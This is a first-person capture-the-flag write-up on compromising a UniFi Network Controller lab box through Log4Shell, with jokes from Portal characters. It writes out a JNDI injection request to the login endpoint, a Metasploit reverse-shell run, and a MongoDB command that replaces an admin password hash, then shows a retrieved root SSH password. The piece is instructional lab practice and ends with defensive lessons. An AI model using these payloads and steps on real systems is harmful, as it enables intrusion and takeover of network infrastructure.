The Mission Briefing

The target today was a Ubiquiti UniFi Network Controller. The kind of device that sits in server closets managing Wi-Fi access points, quietly running a web interface that nobody patches because "it's just the network controller, who's going to attack that?"

Everyone. Everyone is going to attack that. Especially when it's running a version of Log4j that made the entire internet collectively panic in December 2021.

GlaDOS
"Today's test chamber features CVE-2021-44228. You may know it as Log4Shell. The vulnerability that proved, conclusively, that logging user input without sanitization is... inadvisable. The entire software industry learned this lesson simultaneously. Some of them even applied the patch."

GlaDOS had a point. This was Adventure Mode on an Easy box, but Log4Shell is anything but trivial in the real world. Time to see how a $2 billion networking company's product held up against the most famous CVE in recent memory.

Reconnaissance

I started where I always start: a full port scan to see what the target was running.

Six open ports. SSH on 22, and then a cluster of ports in the 6000-8000 range that all pointed to one thing: a UniFi Network Controller. Port 8080 helpfully redirected to the HTTPS management interface on 8443, where a login page was waiting.

curl -sk https://10.129.96.149:8443/status {"meta":{"rc":"ok","up":true,"server_version":"6.4.54","uuid":"8918a2b4-6f90-4f13-8233-e29085bd16d7"},"data":[]}

Version 6.4.54. I didn't even need to check -- I already knew what that meant. Log4Shell was patched in UniFi version 6.5.55. This controller was one version behind the fix.

The Vulnerability

CVE-2021-44228 -- Log4Shell -- is a remote code execution vulnerability in Apache Log4j 2, the ubiquitous Java logging library. The flaw is deceptively simple: Log4j supports JNDI (Java Naming and Directory Interface) lookups in log messages. If an attacker can get a string like ${jndi:ldap://attacker.com/payload} into a log message, Log4j will dutifully reach out to the attacker's server, download a Java class, and execute it.

The UniFi controller logs the remember parameter from login requests. Which means I could inject a JNDI payload through the login form without even needing valid credentials.

Anger Core
"THEY. LOG. USER. INPUT. AND. RESOLVE. IT. AS. CODE."

Before going for full exploitation, I verified the vulnerability was actually triggerable. I set up a tcpdump listener for LDAP traffic and sent a JNDI payload in the login form's remember field.

sudo tcpdump -i tun0 port 389 -n & curl -sk -X POST https://10.129.96.149:8443/api/login -H 'Content-Type: application/json' -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.16:389/test}","strict":true}' 12:15:11.677519 IP 10.129.96.149.35546 > 10.10.14.16.389: Flags [S], seq 1977579353, win 64240, ... 12:15:11.677564 IP 10.10.14.16.389 > 10.129.96.149.35546: Flags [R.], seq 0, ack 1977579354, win 0, length 0

There it was. The target reached out to my machine on port 389 -- an LDAP connection attempt triggered by the JNDI lookup. The vulnerability was confirmed. The UniFi controller was parsing my malicious string from the login form and executing the JNDI lookup, just as the CVE described.

Initial Foothold

With the vulnerability confirmed, I turned to Metasploit. The ubiquiti_unifi_log4shell module handles the entire exploitation chain: it spins up a malicious LDAP server, serves a crafted Java class that establishes a reverse shell, and triggers the whole thing through the vulnerable login endpoint.

sudo msfconsole -q -r /tmp/unified_exploit.rc # RHOSTS=10.129.96.149, LHOST=10.10.14.16, LPORT=4444, SRVHOST=10.10.14.16, SRVPORT=1389, target=Unix [+] The target is vulnerable. [+] Delivering the serialized Java object to execute the payload... [*] Command shell session 1 opened (10.10.14.16:4444 -> 10.129.96.149:34144)

A reverse shell as the unifi user (uid=999). The exploit chain worked exactly as expected: the JNDI payload in the login form triggered an LDAP lookup to my server, which responded with a serialized Java object containing a reverse shell payload. Log4j deserialized it, executed it, and now I had a shell.

Privilege Escalation

I was running as the unifi service account. Not root, not even a regular user. But I had something better than a privilege escalation exploit -- I had access to the UniFi controller's database.

UniFi stores its configuration in MongoDB, and on this box, MongoDB was running locally on port 27117. No authentication required. I queried the ace database for admin accounts.

mongo --port 27117 --quiet --eval 'db = db.getSiblingDB("ace"); db.admin.find({},{name:1,email:1,x_shadow:1}).forEach(printjson)' 5 admin accounts found: administrator, michael, Seamus, warren, james All passwords are SHA-512 ($6$) hashes

Five admin accounts, all with SHA-512 hashes. Cracking SHA-512 takes time. But who said anything about cracking?

GlaDOS
"Why spend cycles breaking a lock when you can simply replace it with one you already have the key to? This is the kind of lateral thinking that separates adequate test subjects from truly disappointing ones."

I replaced the administrator's password hash in MongoDB with a known value -- the SHA-512 hash of "password123".

mongo --port 27117 --quiet --eval 'db = db.getSiblingDB("ace"); db.admin.updateOne({name:"administrator"}, {$set: {x_shadow: "<sha512 hash of password123>"}})' { "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }

With the password changed, I logged into the UniFi web portal as administrator and navigated to the site settings. UniFi controllers have a feature for managing SSH credentials on network devices. And there, stored in plaintext in the site configuration, was the root password.

curl -sk -X POST https://10.129.96.149:8443/api/login -H 'Content-Type: application/json' -d '{"username":"administrator","password":"password123"}' -c /tmp/unifi_cookies.txt curl -sk -b /tmp/unifi_cookies.txt https://10.129.96.149:8443/api/s/default/get/setting | grep -A5 ssh "x_ssh_enabled": true, "x_ssh_username": "root", "x_ssh_password": "NotACrackablePassword4U2022",

What I Learned

  • Log4Shell (CVE-2021-44228) exploits JNDI lookups in Log4j to achieve remote code execution. Any user-controlled input that gets logged can become an attack vector -- in this case, a login form's "remember me" parameter.
  • Version disclosure through status endpoints (/status) makes it trivial for attackers to confirm whether a target is vulnerable before even attempting exploitation.
  • MongoDB without authentication on a local port gave me full read/write access to the application's database. I didn't need to crack password hashes -- I just replaced them.
  • Credential storage in application databases is a recurring pattern. UniFi stored SSH root credentials in its site settings, turning a web application compromise into full system access.
  • Defense in depth matters. If any single layer had been hardened -- patching Log4j, requiring MongoDB authentication, not storing SSH credentials in the web app -- the full chain would have broken.
